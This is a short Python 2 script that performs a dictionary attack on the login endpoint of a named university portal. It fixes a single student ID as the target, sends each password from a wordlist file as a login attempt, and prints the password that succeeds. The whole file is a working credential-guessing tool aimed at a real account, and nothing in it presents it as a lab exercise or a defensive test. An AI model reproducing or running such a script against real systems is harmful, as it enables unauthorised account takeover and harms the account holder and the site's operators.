import urllib2
import urllib
import os
login_url="http://myportal.sit.edu.cn/userPasswordValidate.portal"
num = '1610400126'

def AutoLogin(username,password):
    post_request = urllib.urlencode({'MIME Type':'application/x-www-form-urlencoded',
    'Login.Token1':username,
    'Login.Token2':password,
    'goto':'http://myportal.sit.edu.cn/loginSuccess.portal',
    'gotoOnFail':'http://myportal.sit.edu.cn/loginFailure.portal'})
    req = urllib2.Request(url = login_url, data=post_request)
    res = urllib2.urlopen(req).read()
    return res
def StatusCode(r):
    re1 = r.split('.')
    re2 = re1[1].split(';')
    if re2[0] == "handleLoginSuccessed()":
        return 'Successed'
    else:
        return 'Failed'
    
if __name__=="__main__":
    f = open("pwd_dty_m.txt","r")
    pwd_ls = f.read().split('\n')
    i = 0 #index of list
    while True:
        res = AutoLogin(num,pwd_ls[i])
        print pwd_ls[i]
        if StatusCode(res) == 'Successed':
            print "password is ready"
            print pwd_ls[i]
            break
        else:
            i = i+1
    f.close()
